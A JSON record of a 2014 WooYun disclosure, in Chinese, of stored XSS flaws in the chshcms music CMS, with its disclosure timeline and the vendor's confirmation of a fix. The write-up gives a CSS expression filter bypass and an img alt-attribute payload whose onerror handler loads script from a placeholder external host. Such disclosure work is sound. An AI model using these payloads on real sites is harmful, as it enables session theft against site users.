{"id": 55665, "wybug_id": "wooyun-2014-060274", "wybug_title": "程氏舞曲储存型xss (4) #2处xss", "wybug_corp": "chshcms.com", "wybug_author": "roker", "wybug_date": "2014-05-12 18:27", "wybug_open_date": "2014-08-10 18:28", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向公众公开  简要描述： 雨师傅叫我看的，所以我就挖了 详细说明：  首先 我们来回顾下  WooYun: 程氏舞曲储存型xss（3）附后台getshell 我曾说过“ 基本可以确定 是判断 <>内 是否存在 script onerror onclick。。。等关键字。 这样就很好办了， 找到一个位于html 标签属性内的可控点 就行了”ok， 先前的修补了， 双引号被实体编码。一：首先， 按照 以前的思路 很快 我们 得到第一处 xss。http://localhost/index.php/user/edit/web_save修改主页背景。 cs_bgpic可控 且 带入到了 我们用户的 主页html文件中 的 style标签。\n<body style=\"background-image:url(cs_bgpic\")\">\n 提交e/**/xpression绕过对 expression 的过滤test：  \ncs_bgpic=njhbh);a:e/**/xpression(setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))\n\n\n\n\n当然，这个是有条件限制的 仅限于ie浏览器 且 <=ie7二：场景限制什么的 最讨厌了。通用型的 才是王道。仔细想了想，按照程序猿的思路 ，发表文章的 富文本既然是 检测<>标签内的话。。我们可以这样 提交\n<img src=\"x\"alt=\"/>\"onerror=document.body.appendChild(document.createElement('script')).src='//xxx.xxx'>\n 巧妙的利用 img 标签内 alt属性没被过滤， 双引号 包裹住\"/>\". 在浏览器 解析下 “/>”会被当做alt的属性值 ，然而 ，在 程序的 检测下 ”onerror已经脱离标签外 看起来无害了“。test:\n\n审核查看文章时。触发\n\n   漏洞证明：  \n\n\n\n   修复方案：  继续修复呗= =富文本 在不影响用户体验和使用的情况下 防御xss确实有点小难度~   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-12 18:56 厂商回复： 经过检测 漏洞确实存在~！已经修复，感谢您的支持~！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}